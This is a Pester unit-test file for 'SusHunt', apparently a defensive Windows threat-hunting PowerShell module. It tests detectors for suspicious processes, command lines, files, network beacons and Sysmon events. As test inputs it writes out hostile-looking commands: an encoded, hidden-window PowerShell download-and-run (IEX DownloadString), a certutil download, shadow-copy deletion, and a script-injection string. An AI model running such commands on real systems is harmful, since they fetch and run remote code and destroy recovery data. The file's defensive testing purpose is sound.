# Unit tests for the pure logic (no machine state needed). Written for the Pester 3.4 that ships
# with Windows (also runs on Pester 4). Run from the repo root:  Invoke-Pester .\tests

$root = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
Import-Module (Join-Path $root 'SusHunt.psm1') -Force

InModuleScope SusHunt {
    Describe 'Test-IpInCidr' {
        It 'matches the last address inside an IPv4 /12' { Test-IpInCidr '172.31.255.254' '172.16.0.0/12' | Should Be $true }
        It 'rejects the first address after it' { Test-IpInCidr '172.32.0.1' '172.16.0.0/12' | Should Be $false }
        It 'handles a prefix that splits a byte (/10)' { Test-IpInCidr '100.127.0.1' '100.64.0.0/10' | Should Be $true }
        It 'handles IPv6' { Test-IpInCidr 'fe80::1234' 'fe80::/10' | Should Be $true }
        It 'never matches across address families' { Test-IpInCidr '10.0.0.1' '::/0' | Should Be $false }
    }

    Describe 'Get-IpScope' {
        It 'knows RFC 1918' { Get-IpScope '192.168.1.10' | Should Be 'Private' }
        It 'knows CGNAT (Tailscale range)' { Get-IpScope '100.101.102.103' | Should Be 'CGNAT' }
        It 'unwraps IPv4-mapped IPv6' { Get-IpScope '::ffff:10.1.2.3' | Should Be 'Private' }
        It 'calls the any-address Unspecified' { Get-IpScope '0.0.0.0' | Should Be 'Unspecified' }
        It 'defaults to Public' { Get-IpScope '1.1.1.1' | Should Be 'Public' }
        It 'rejects junk' { Get-IpScope 'not-an-ip' | Should Be 'Invalid' }
    }

    Describe 'network byte order' {
        It 'swaps the two port bytes (443 = 0x01BB -> 0xBB01)' { ConvertTo-NetworkOrderPort 443 | Should Be 0xBB01 }
        It 'lays out 127.0.0.1 as 7F 00 00 01 in memory' { ConvertTo-NetworkOrderAddress '127.0.0.1' | Should Be 0x0100007F }
    }

    Describe 'Get-EditDistance' {
        It 'counts a classic example' { Get-EditDistance 'kitten' 'sitting' | Should Be 3 }
        It 'treats a swap of neighbours as one edit' { Get-EditDistance 'scvhost' 'svchost' | Should Be 1 }
        It 'is zero for equal strings, ignoring case' { Get-EditDistance 'LSASS' 'lsass' | Should Be 0 }
    }

    Describe 'Get-LookalikeName' {
        It 'catches a digit swap' { Get-LookalikeName 'svch0st.exe' | Should Be 'svchost.exe' }
        It 'catches a letter swap' { Get-LookalikeName 'lsasss.exe' | Should Be 'lsass.exe' }
        It 'leaves the real name alone' { Get-LookalikeName 'svchost.exe' | Should BeNullOrEmpty }
        It 'leaves known real near-misses alone' { Get-LookalikeName 'taskhost.exe' | Should BeNullOrEmpty }
        It 'leaves unrelated names alone' { Get-LookalikeName 'notepad.exe' | Should BeNullOrEmpty }
    }

    Describe 'Get-CommandLineSignals' {
        $payload = 'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a")'
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        It 'flags an encoded command and looks inside it' {
            $rules = @(Get-CommandLineSignals "powershell.exe -nop -w hidden -enc $enc" | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $true
            $rules -contains 'DownloadAndRun(decoded)' | Should Be $true
            $rules -contains 'HiddenWindow' | Should Be $true
        }
        It 'shows the decoded text as evidence' {
            $s = Get-CommandLineSignals "powershell -e $enc" | Where-Object { $_.Rule -eq 'EncodedPowerShell' }
            $s.Evidence | Should Match 'DownloadString'
        }
        It 'does not mistake -ExecutionPolicy for -EncodedCommand' {
            $rules = @(Get-CommandLineSignals 'powershell.exe -ExecutionPolicy Bypass -File C:\x.ps1' | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $false
            $rules -contains 'PolicyBypass' | Should Be $true
        }
        It 'flags certutil used as a downloader' {
            (Get-CommandLineSignals 'certutil.exe -urlcache -split -f http://example.invalid/a.exe a.exe').Rule | Should Be 'CertutilDownload'
        }
        It 'flags shadow copy deletion' {
            (Get-CommandLineSignals 'vssadmin.exe delete shadows /all /quiet').Rule | Should Be 'InhibitRecovery'
        }
        It 'stays quiet on an ordinary command' {
            Get-CommandLineSignals '"C:\Windows\System32\notepad.exe" C:\notes.txt' | Should BeNullOrEmpty
        }
    }

    Describe 'Get-ExecutableFromCommand' {
        $cmdExe = Join-Path $env:windir 'System32\cmd.exe'
        It 'takes a quoted path as-is' { Get-ExecutableFromCommand "`"$cmdExe`" /c echo hi" | Should Be $cmdExe }
        It 'walks an unquoted path the way CreateProcess does' { Get-ExecutableFromCommand "$cmdExe /c echo hi" | Should Be $cmdExe }
        It 'expands environment variables' { Get-ExecutableFromCommand '%windir%\System32\cmd.exe /c' | Should Be $cmdExe }
        It 'resolves a bare name through PATH' { Get-ExecutableFromCommand 'cmd.exe /c echo hi' | Should Be $cmdExe }
        It 'resolves a quoted bare name through PATH' { Get-ExecutableFromCommand '"cmd.exe" /c echo hi' | Should Be $cmdExe }
    }

    Describe 'Test-UnquotedServicePath' {
        It 'flags spaces without quotes' { Test-UnquotedServicePath 'C:\Program Files\Vendor App\svc.exe -k' | Should Be $true }
        It 'accepts a quoted path' { Test-UnquotedServicePath '"C:\Program Files\Vendor App\svc.exe" -k' | Should Be $false }
        It 'ignores a path without spaces' { Test-UnquotedServicePath 'C:\Tools\svc.exe' | Should Be $false }
    }

    Describe 'Get-PathRisk' {
        It 'rates Temp as high risk' { Get-PathRisk 'C:\Users\someone\AppData\Local\Temp\x.exe' | Should Be 'HighRisk' }
        It 'rates Downloads as high risk' { Get-PathRisk 'C:\Users\someone\Downloads\setup.exe' | Should Be 'HighRisk' }
        It 'rates Roaming as user-writable' { Get-PathRisk 'C:\Users\someone\AppData\Roaming\App\app.exe' | Should Be 'UserWritable' }
        It 'knows Program Files' { Get-PathRisk 'C:\Program Files (x86)\App\app.exe' | Should Be 'ProgramFiles' }
        It 'knows the Windows folder' { Get-PathRisk (Join-Path $env:windir 'System32\svchost.exe') | Should Be 'Windows' }
        It 'normalizes \??\ prefixes' { Get-PathRisk ('\??\' + (Join-Path $env:windir 'System32\conhost.exe')) | Should Be 'Windows' }
    }

    Describe 'Test-Beacon' {
        It 'spots a 30 s timer with jitter' {
            $b = Test-Beacon @(0, 30, 61, 90, 121, 150, 180)
            $b | Should Not BeNullOrEmpty
            $b.MeanSeconds | Should Be 30
        }
        It 'ignores bursty traffic' { Test-Beacon @(0, 2, 5, 60, 61, 200, 204) | Should BeNullOrEmpty }
        It 'needs enough samples' { Test-Beacon @(0, 30, 60) | Should BeNullOrEmpty }
    }

    Describe 'New-Finding' {
        It 'sums and caps the score at 100' {
            $f = New-Finding -Category 'Test' -Name 'x' -Signals @((New-Signal 'A' 70 '' '' ''), (New-Signal 'B' 60 '' '' ''))
            $f.Score | Should Be 100
            $f.Severity | Should Be 'High'
            $f.Summary | Should Be 'A, B'
        }
        It 'scores zero with no signals' { (New-Finding -Category 'Test' -Name 'x' -Signals @()).Score | Should Be 0 }
    }

    Describe 'Get-PathRisk: user-writable folders inside Windows' {
        It 'does not trust C:\Windows\Tasks' { Get-PathRisk (Join-Path $env:windir 'Tasks\x.exe') | Should Be 'HighRisk' }
        It 'does not trust the spool color folder' { Get-PathRisk (Join-Path $env:windir 'System32\spool\drivers\color\x.exe') | Should Be 'HighRisk' }
        It 'still trusts System32 itself' { Get-PathRisk (Join-Path $env:windir 'System32\notepad.exe') | Should Be 'Windows' }
    }

    Describe 'signature cache' {
        It 'does not cache a missing file' {
            $p = Join-Path $env:TEMP ("sushunt-missing-{0}.exe" -f [guid]::NewGuid())
            (Get-FileSignature $p).Exists | Should Be $false
            $script:SigCache.ContainsKey($p) | Should Be $false
        }
        It 'caches a real file with a stamp' {
            $p = Join-Path $env:windir 'System32\notepad.exe'
            (Get-FileSignature $p).Status | Should Be 'Valid'
            $script:SigCache[$p].Stamp | Should Not BeNullOrEmpty
        }
    }

    Describe 'Resolve-BareCommand' {
        $sys32 = Join-Path $env:windir 'System32'
        It 'finds a System32 program first' { Resolve-BareCommand 'cmd.exe' -PathScope Machine | Should Be (Join-Path $sys32 'cmd.exe') }
        It 'adds .exe when the name has no extension' { Resolve-BareCommand 'cmd' -PathScope Machine | Should Be (Join-Path $sys32 'cmd.exe') }
        It 'checks the working directory before PATH' {
            $dir = Join-Path $env:TEMP ("sushunt-wd-{0}" -f [guid]::NewGuid())
            $null = New-Item -ItemType Directory -Path $dir
            try {
                $null = New-Item -ItemType File -Path (Join-Path $dir 'sushunt-test-tool.exe')
                Resolve-BareCommand 'sushunt-test-tool.exe' -WorkingDirectory $dir -PathScope Machine | Should Be (Join-Path $dir 'sushunt-test-tool.exe')
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force }
        }
        It 'returns nothing for an unknown name' { Resolve-BareCommand 'no-such-program-sushunt' -PathScope Machine | Should BeNullOrEmpty }
    }

    Describe 'Get-SearchOrderSignal' {
        It 'flags a bare name that resolved into a user folder' {
            (Get-SearchOrderSignal 'tool.exe -x' 'C:\Users\someone\AppData\Local\Temp\tool.exe').Rule | Should Be 'BareNameWritableDir'
        }
        It 'ignores a full path' { Get-SearchOrderSignal 'C:\Users\someone\tool.exe' 'C:\Users\someone\tool.exe' | Should BeNullOrEmpty }
        It 'ignores a bare name that resolved into System32' {
            Get-SearchOrderSignal 'cmd.exe /c' (Join-Path $env:windir 'System32\cmd.exe') | Should BeNullOrEmpty
        }
    }

    Describe 'Test-SameProcess' {
        $me = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
        It 'accepts the same process' {
            Test-SameProcess ([pscustomobject]@{ PID = $PID; ProcessStart = $me.CreationDate; Path = (ConvertTo-NormalPath $me.ExecutablePath) }) | Should Be $true
        }
        It 'rejects a different start time (PID reuse)' {
            Test-SameProcess ([pscustomobject]@{ PID = $PID; ProcessStart = $me.CreationDate.AddMinutes(-5); Path = $null }) | Should Be $false
        }
    }

    Describe 'native queries' {
        Initialize-SusNative
        It 'describes a process the same way WMI does' {
            $cim = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
            $me = [SusHunt.V4.Win32]::DescribePid($PID)
            $me.ExecutablePath | Should Be $cim.ExecutablePath
            $me.CommandLine | Should Be $cim.CommandLine
            $me.ParentProcessId | Should Be $cim.ParentProcessId
        }
        It 'reports a new process once, with its parent' {
            [SusHunt.V4.Win32]::ResetProcessPolling()
            $null = [SusHunt.V4.Win32]::PollNewProcesses()
            $p = Start-Process ping.exe -ArgumentList '-n', '3', '127.0.0.1' -WindowStyle Hidden -PassThru
            try {
                Start-Sleep -Milliseconds 300
                $first = @([SusHunt.V4.Win32]::PollNewProcesses() | Where-Object { $_.ProcessId -eq $p.Id })
                $first.Count | Should Be 1
                $first[0].ParentProcessId | Should Be $PID
                @([SusHunt.V4.Win32]::PollNewProcesses() | Where-Object { $_.ProcessId -eq $p.Id }).Count | Should Be 0
            } finally { $p.WaitForExit(5000) | Out-Null }
        }
        It 'lists TCP connections with owners' {
            $rows = @([SusHunt.V4.Win32]::GetTcpConnections())
            $rows.Count | Should BeGreaterThan 0
            @($rows | Where-Object { $_.State -eq 'Listen' }).Count | Should BeGreaterThan 0
        }
    }

    Describe 'HTML report' {
        It 'encodes values so markup in a process name stays text' {
            $f = New-Finding -Category 'Process' -Name '<script>alert(1)</script>' -Signals @(New-Signal 'R' 20 'T1036.005' 'why & how' '<b>')
            $html = ConvertTo-SusFindingHtml @($f)
            $html | Should Match '&lt;script&gt;alert\(1\)&lt;/script&gt;'
            $html | Should Not Match '<script>alert'
            $html | Should Match 'attack.mitre.org/techniques/T1036/005/'
        }
        It 'renders an empty change list' { ConvertTo-SusChangeHtml @() | Should Match 'No changes since the baseline' }
    }

    Describe 'Sysmon event parsing' {
        function New-SysmonXml($id, $data) {
            $fields = ($data.GetEnumerator() | ForEach-Object { "<Data Name='$($_.Key)'>$($_.Value)</Data>" }) -join ''
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>$id</EventID><TimeCreated SystemTime='2026-01-01T12:00:00.000Z'/></System><EventData>$fields</EventData></Event>"
        }
        It 'reads EventID, time and data fields' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 1 @{ Image = 'C:\Windows\System32\notepad.exe'; ProcessId = '42' })
            $e.Id | Should Be 1
            $e.Image | Should Be 'C:\Windows\System32\notepad.exe'
            $e.Time.ToUniversalTime().Year | Should Be 2026
        }
        It 'scores a document app starting a shell' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 1 @{
                Image = (Join-Path $env:windir 'System32\WindowsPowerShell\v1.0\powershell.exe'); ProcessId = '200'; ParentProcessId = '100'
                ParentImage = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'; CommandLine = 'powershell.exe -NoProfile' })
            $r = Get-SysmonEventSignals $e @{} @{}
            @($r.Signals | ForEach-Object { $_.Rule }) -contains 'DocumentSpawnedShell' | Should Be $true
        }
        It 'ignores private-network connections' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 3 @{ Image = 'C:\x\app.exe'; DestinationIp = '192.168.1.10'; DestinationPort = '443' })
            Get-SysmonEventSignals $e @{} @{} | Should BeNullOrEmpty
        }
        It 'spots a DNS lookup repeating on a timer' {
            $times = @{}; $alerted = @{}; $result = $null
            foreach ($s in 0, 60, 121, 180, 241, 300, 360) {
                $t = ([datetime]'2026-01-01T12:00:00Z').AddSeconds($s).ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
                $xml = (New-SysmonXml 22 @{ Image = 'C:\x\app.exe'; QueryName = 'updates.example.invalid' }) -replace '2026-01-01T12:00:00.000Z', $t
                $r = Get-SysmonEventSignals (ConvertFrom-SysmonEventXml $xml) $times $alerted
                if ($r.Type -eq 'BEACON') { $result = $r }
            }
            $result | Should Not BeNullOrEmpty
        }
    }

    Describe 'files: entropy' {
        It 'is 0 for all zeros' { Get-ShannonEntropy (New-Object byte[] 4096) | Should Be 0 }
        It 'is 8 when all 256 byte values appear equally often' {
            [Math]::Round((Get-ShannonEntropy ([byte[]](0..255))), 6) | Should Be 8
        }
        It 'honours offset and count' {
            $b = [byte[]](@(0) * 256 + (0..255))
            [Math]::Round((Get-ShannonEntropy $b 256 256), 6) | Should Be 8
        }
    }

    Describe 'files: PE parser' {
        # A minimal 64-bit DLL header, built by hand: DOS header, PE signature, COFF header,
        # optional header (0xF0 bytes) and a two-entry section table. No real binary in the repo.
        function New-TestPe {
            $b = New-Object byte[] 0x200
            $b[0] = 0x4D; $b[1] = 0x5A                                              # 'MZ'
            [BitConverter]::GetBytes([int]0x80).CopyTo($b, 0x3C)                    # e_lfanew
            $b[0x80] = 0x50; $b[0x81] = 0x45                                        # 'PE\0\0'
            [BitConverter]::GetBytes([uint16]0x8664).CopyTo($b, 0x84)               # machine x64
            [BitConverter]::GetBytes([uint16]2).CopyTo($b, 0x86)                    # 2 sections
            [BitConverter]::GetBytes([uint32]1700000000).CopyTo($b, 0x88)           # 2023-11-14
            [BitConverter]::GetBytes([uint16]0xF0).CopyTo($b, 0x94)                 # optional header size
            [BitConverter]::GetBytes([uint16]0x2022).CopyTo($b, 0x96)               # DLL | EXECUTABLE
            [BitConverter]::GetBytes([uint16]0x20B).CopyTo($b, 0x98)                # PE32+
            $t = 0x98 + 0xF0
            [Text.Encoding]::ASCII.GetBytes('.text').CopyTo($b, $t)
            [BitConverter]::GetBytes([uint32]0x100).CopyTo($b, $t + 16)
            [BitConverter]::GetBytes([uint32]0x400).CopyTo($b, $t + 20)
            [BitConverter]::GetBytes([uint32]0x60000020).CopyTo($b, $t + 36)        # code, execute, read
            [Text.Encoding]::ASCII.GetBytes('.data').CopyTo($b, $t + 40)
            [BitConverter]::GetBytes([uint32]0xC0000040L).CopyTo($b, $t + 76)        # data, read, write
            , $b
        }
        $pe = Get-PeInfo (New-TestPe)

        It 'reads the machine type' { $pe.Machine | Should Be 'x64' }
        It 'knows PE32+ from the optional header magic' { $pe.Is64 | Should Be $true }
        It 'knows a DLL from the COFF flags' { $pe.IsDll | Should Be $true }
        It 'turns TimeDateStamp into a UTC date' { $pe.CompileTime.ToString('yyyy-MM-dd') | Should Be '2023-11-14' }
        It 'reads the section table' {
            $pe.Sections.Count | Should Be 2
            $pe.Sections[0].Name | Should Be '.text'
            $pe.Sections[0].RawOffset | Should Be 0x400
        }
        It 'marks only code sections executable' {
            $pe.Sections[0].Executable | Should Be $true
            $pe.Sections[1].Executable | Should Be $false
        }
        It 'returns nothing for a non-PE file' {
            Get-PeInfo ([Text.Encoding]::ASCII.GetBytes('hello world, not a program. ' * 4)) | Should BeNullOrEmpty
        }
        It 'returns nothing for MZ without a PE signature' {
            $b = New-TestPe; $b[0x80] = 0
            Get-PeInfo $b | Should BeNullOrEmpty
        }
        It 'flags a section table cut off by a short read' {
            $b = New-TestPe; [Array]::Resize([ref]$b, 0x1A0)
            (Get-PeInfo $b).Truncated | Should Be $true
        }
    }

    Describe 'files: Mark-of-the-Web' {
        It 'reads ZoneId and URLs from a Zone.Identifier stream' {
            $z = ConvertFrom-ZoneIdentifier "[ZoneTransfer]`r`nZoneId=3`r`nReferrerUrl=https://example.com/page`r`nHostUrl=https://example.com/setup.exe`r`n"
            $z.ZoneId | Should Be 3
            $z.HostUrl | Should Be 'https://example.com/setup.exe'
            $z.ReferrerUrl | Should Be 'https://example.com/page'
        }
        It 'returns nothing for empty text' { ConvertFrom-ZoneIdentifier '' | Should BeNullOrEmpty }
    }

    Describe 'files: extension mismatch' {
        $mz = [byte[]](0x4D, 0x5A, 0x90, 0)
        It 'flags a program named like a text file' { Test-ExtensionMismatch 'notes.txt' $mz | Should Be $true }
        It 'leaves a real .exe alone' { Test-ExtensionMismatch 'tool.exe' $mz | Should Be $false }
        It 'leaves a real text file alone' { Test-ExtensionMismatch 'notes.txt' ([byte[]](0x68, 0x69)) | Should Be $false }
        It 'leaves .tmp alone (installers keep real programs there)' { Test-ExtensionMismatch 'is-1234.tmp' $mz | Should Be $false }
    }

    Describe 'files: scoring' {
        function Get-RuleName { param([hashtable]$Info) @(Get-FileSignals $Info | ForEach-Object { $_.Rule }) }
        $pe = [pscustomobject]@{ Machine = 'x64'; Is64 = $true; IsDll = $false; CompileTime = [datetime]'2024-01-01'; Sections = @(); Truncated = $false }
        $web = [pscustomobject]@{ ZoneId = 3; HostUrl = 'https://example.com/a'; ReferrerUrl = $null }

        It 'shares the double-extension check with processes' {
            (Get-RuleName @{ Name = 'invoice.pdf.exe'; Path = 'C:\Users\someone\Downloads\invoice.pdf.exe' }) -contains 'DoubleExtension' | Should Be $true
        }
        It 'scores a downloaded disk image twice' {
            $r = Get-RuleName @{ Name = 'invoice.iso'; Path = 'C:\Users\someone\Downloads\invoice.iso'; Zone = $web }
            $r -contains 'DownloadedExecutable' | Should Be $true
            $r -contains 'DiskImage' | Should Be $true
        }
        It 'ignores zone 2 (intranet)' {
            $z = [pscustomobject]@{ ZoneId = 2; HostUrl = $null; ReferrerUrl = $null }
            (Get-RuleName @{ Name = 'a.exe'; Path = 'C:\x\a.exe'; Zone = $z }).Count | Should Be 0
        }
        It 'scores an unsigned, packed program in Temp' {
            $r = Get-RuleName @{ Name = 'a.exe'; Path = 'C:\Users\someone\AppData\Local\Temp\a.exe'; Pe = $pe; Risk = 'HighRisk'
                Signature = [pscustomobject]@{ Status = 'NotSigned' }; Entropy = @{ Section = 'UPX1'; Value = 7.9 } }
            $r -contains 'UnsignedInHighRisk' | Should Be $true
            $r -contains 'PackedSection' | Should Be $true
        }
        It 'does not count packing on a signed program' {
            $r = Get-RuleName @{ Name = 'a.exe'; Path = 'C:\x\a.exe'; Pe = $pe; Risk = 'HighRisk'
                Signature = [pscustomobject]@{ Status = 'Valid' }; Entropy = @{ Section = '.text'; Value = 7.9 } }
            $r.Count | Should Be 0
        }
        It 'flags a compile time in the future' {
            $future = $pe.PSObject.Copy(); $future.CompileTime = [datetime]::UtcNow.AddYears(5)
            (Get-RuleName @{ Name = 'a.exe'; Path = 'C:\x\a.exe'; Pe = $future }) -contains 'OddCompileTime' | Should Be $true
        }
        It 'scores a shortcut that runs encoded PowerShell' {
            $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output hello from a test'))
            $r = Get-RuleName @{ Name = 'Invoice.lnk'; Path = 'C:\Users\someone\Desktop\Invoice.lnk'
                Shortcut = @{ Target = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Arguments = "-w hidden -enc $enc" } }
            $r -contains 'LnkRunsShell' | Should Be $true
            $r -contains 'EncodedPowerShell' | Should Be $true
        }
        It 'leaves a shortcut to a document alone' {
            (Get-RuleName @{ Name = 'a.lnk'; Path = 'C:\x\a.lnk'; Shortcut = @{ Target = 'C:\Users\someone\Documents\a.docx'; Arguments = '' } }).Count | Should Be 0
        }
        It 'flags a hidden script' {
            (Get-RuleName @{ Name = 'u.vbs'; Path = 'C:\Users\someone\AppData\Roaming\u.vbs'; Hidden = $true }) -contains 'HiddenInUserDir' | Should Be $true
        }
    }

    Describe 'files: walking folders' {
        It 'skips browser caches but not program folders' {
            Test-SkippedDir 'C:\Users\someone\AppData\Local\Google\Chrome\User Data\Default\Cache' | Should Be $true
            Test-SkippedDir 'C:\Users\someone\AppData\Roaming\Mozilla\Firefox\Profiles\ab12.default\storage' | Should Be $true
            Test-SkippedDir 'C:\Users\someone\AppData\Local\Programs\SomeApp' | Should Be $false
        }
        It 'finds recent files, including new copies of old files, and skips old ones and caches' {
            $root = Join-Path $TestDrive 'walk'
            $null = New-Item -ItemType Directory -Path (Join-Path $root 'sub\Cache') -Force
            'x' | Set-Content (Join-Path $root 'sub\new.ps1')
            'x' | Set-Content (Join-Path $root 'sub\Cache\skipped.js')
            $old = Join-Path $root 'old.exe'; 'x' | Set-Content $old
            (Get-Item $old).CreationTime = (Get-Date).AddDays(-30); (Get-Item $old).LastWriteTime = (Get-Date).AddDays(-30)
            $copy = Join-Path $root 'copied.exe'; 'x' | Set-Content $copy
            (Get-Item $copy).LastWriteTime = (Get-Date).AddDays(-30)   # Copy-Item keeps the old write time
            $names = @(Find-RecentFile -Roots @($root) -Since (Get-Date).AddDays(-1) | ForEach-Object { $_.Name } | Sort-Object)
            ($names -join ',') | Should Be 'copied.exe,new.ps1'
        }
    }

    Describe 'files: YARA output' {
        It 'reads rule, ATT&CK meta and path' {
            $h = @(ConvertFrom-YaraOutput @('Test_Rule [attack="T1059.001",author="x"] C:\Users\someone\AppData\Local\Temp\a b.ps1'))
            $h[0].Rule | Should Be 'Test_Rule'
            $h[0].Attack | Should Be 'T1059.001'
            $h[0].Path | Should Be 'C:\Users\someone\AppData\Local\Temp\a b.ps1'
        }
        It 'reads a line without meta' {
            (ConvertFrom-YaraOutput @('Rule2 C:\x\y.exe')).Path | Should Be 'C:\x\y.exe'
        }
    }

    Describe 'gui: pure helpers' {
        $sig = New-Signal -Rule 'ExtensionMismatch' -Points 40 -Attack 'T1036.008' -Why 'A program named like a document.' -Evidence 'MZ header in .txt'
        $finding = New-Finding -Category 'File' -Name 'notes.txt' -Id ('A' * 64) -Path 'C:\Users\someone\AppData\Local\Temp\notes.txt' -Context 'size 1 bytes' -Signals @($sig)

        It 'flattens a finding and keeps the original' {
            $r = ConvertTo-SusGridRow $finding
            $r.Kind | Should Be 'Finding'
            $r.Severity | Should Be 'Medium'
            $r.Summary | Should Be 'ExtensionMismatch'
            $r.Item.Id | Should Be ('A' * 64)
        }
        It 'uses the change type as the severity of a diff row' {
            $c = [pscustomobject]@{ PSTypeName = 'SusHunt.Change'; Change = 'Added'; Kind = 'Autorun'; Key = 'Run\x'; Before = $null; After = 'C:\x.exe' }
            $r = ConvertTo-SusGridRow $c
            $r.Severity | Should Be 'Added'
            $r.Summary | Should Be 'C:\x.exe'
        }
        It 'gives connections no severity, so the severity ticks never hide them' {
            $c = [pscustomobject]@{ PSTypeName = 'SusHunt.Connection'; Protocol = 'TCP'; State = 'Established'; Local = '10.0.0.2:5000'
                Remote = '1.1.1.1:443'; Scope = 'Public'; Signature = 'Valid'; PID = 42; Process = 'app.exe'; Path = 'C:\app.exe'; Note = $null }
            $r = ConvertTo-SusGridRow $c
            $r.Name | Should Be 'app.exe (42)'
            Test-SusRowFilter $r '' @() | Should Be $true
        }
        It 'turns plain output (the baseline path) into a text row' {
            (ConvertTo-SusGridRow 'C:\x\baseline_1.json').Kind | Should Be 'Text'
        }

        It 'filters by severity' {
            $r = ConvertTo-SusGridRow $finding
            Test-SusRowFilter $r '' @('High', 'Medium') | Should Be $true
            Test-SusRowFilter $r '' @('High', 'Low') | Should Be $false
        }
        It 'filters by text in Name, Path or Summary, ignoring case' {
            $r = ConvertTo-SusGridRow $finding
            Test-SusRowFilter $r 'NOTES' @('Medium') | Should Be $true
            Test-SusRowFilter $r 'appdata\local' @('Medium') | Should Be $true
            Test-SusRowFilter $r 'extensionmis' @('Medium') | Should Be $true
            Test-SusRowFilter $r 'invoice' @('Medium') | Should Be $false
        }
        It 'treats filter text literally, not as a wildcard' {
            Test-SusRowFilter (ConvertTo-SusGridRow $finding) 'no*es' @('Medium') | Should Be $false
        }

        It 'shows Days and Extra folder only for Files' {
            ((Get-SusScanOption 'Files').Options -join ',') | Should Be 'MinScore,Days,Path'
            ((Get-SusScanOption 'Triage').Options -join ',') | Should Be 'MinScore'
            (Get-SusScanOption 'Autoruns').Options.Count | Should Be 0
        }
        It 'uses the same default thresholds as the CLI' {
            (Get-SusScanOption 'Triage').MinScore | Should Be 20
            (Get-SusScanOption 'Files').MinScore | Should Be 15
        }
        It 'has no HTML report for connections or baseline' {
            (Get-SusScanOption 'Connections').Report | Should BeNullOrEmpty
            (Get-SusScanOption 'Baseline').Report | Should BeNullOrEmpty
        }
        It 'rejects an unknown scan' {
            { Get-SusScanOption 'Nope' } | Should Throw
        }
        It 'only calls exported module functions from the scan runspace' {
            $exported = @((Get-Module SusHunt).ExportedFunctions.Keys)
            $called = @([regex]::Matches($script:GuiScanScript, '\b[A-Z][a-z]+-Sus[A-Za-z]+\b') | ForEach-Object { $_.Value } | Sort-Object -Unique)
            $called.Count | Should BeGreaterThan 5
            foreach ($c in $called) { $exported -contains $c | Should Be $true }
        }

        It 'lists the same fields and signals as the HTML report, with the ATT&CK link' {
            $lines = @(Get-SusDetailLine (ConvertTo-SusGridRow $finding))
            ($lines | Where-Object { $_.Label -eq 'Path' }).Text | Should Be $finding.Path
            $s = $lines | Where-Object { $_.Link }
            $s.Link | Should Be 'T1036.008'
            $s.Url | Should Be 'https://attack.mitre.org/techniques/T1036/008/'
            $s.Text | Should Be 'ExtensionMismatch: A program named like a document.'
            ($lines | Where-Object { $_.Label -match 'evidence' }).Text | Should Be 'MZ header in .txt'
            (ConvertTo-SusFindingHtml @($finding)) -match [regex]::Escape('https://attack.mitre.org/techniques/T1036/008/') | Should Be $true
        }

        It 'appends an allowlist entry once, with wildcards escaped' {
            $file = Join-Path $TestDrive 'allowlist.txt'
            '# comment' | Set-Content -LiteralPath $file -Encoding Ascii
            Add-SusAllowlistEntry -Path 'C:\Temp\a[1].exe' -File $file | Should Be $true
            Add-SusAllowlistEntry -Path 'c:\temp\A[1].EXE' -File $file | Should Be $false
            $lines = @(Get-Content -LiteralPath $file)
            $lines.Count | Should Be 2
            $lines[1] | Should Be 'C:\Temp\a`[1`].exe'
            $f = [pscustomobject]@{ Path = 'C:\Temp\a[1].exe'; Name = 'a[1].exe' }
            Test-Allowlisted $f @($lines[1]) | Should Be $true
        }
        It 'creates the allowlist file when it is missing' {
            $file = Join-Path $TestDrive 'new-allowlist.txt'
            Add-SusAllowlistEntry -Path 'C:\x.exe' -File $file | Should Be $true
            @(Get-Content -LiteralPath $file) -join '|' | Should Be 'C:\x.exe'
        }
        It 'starts a new line when the file does not end with one' {
            $file = Join-Path $TestDrive 'noeol.txt'
            [IO.File]::WriteAllText($file, 'C:\first.exe')
            $null = Add-SusAllowlistEntry -Path 'C:\second.exe' -File $file
            @(Get-Content -LiteralPath $file) -join '|' | Should Be 'C:\first.exe|C:\second.exe'
        }

        It 'uses the report colours for light and dark' {
            (Get-SusGuiPalette $false).High | Should Be '#c62828'
            (Get-SusGuiPalette $true).High | Should Be '#ff6b6b'
        }
        It 'loads the window layout as plain XAML with no code or event hooks' {
            $text = Get-Content -LiteralPath (Join-Path (Get-Module SusHunt).ModuleBase 'lib\Gui.xaml') -Raw
            [xml]$text | Should Not BeNullOrEmpty
            $text -match 'x:Class|x:Code|Click=' | Should Be $false
        }
    }
}
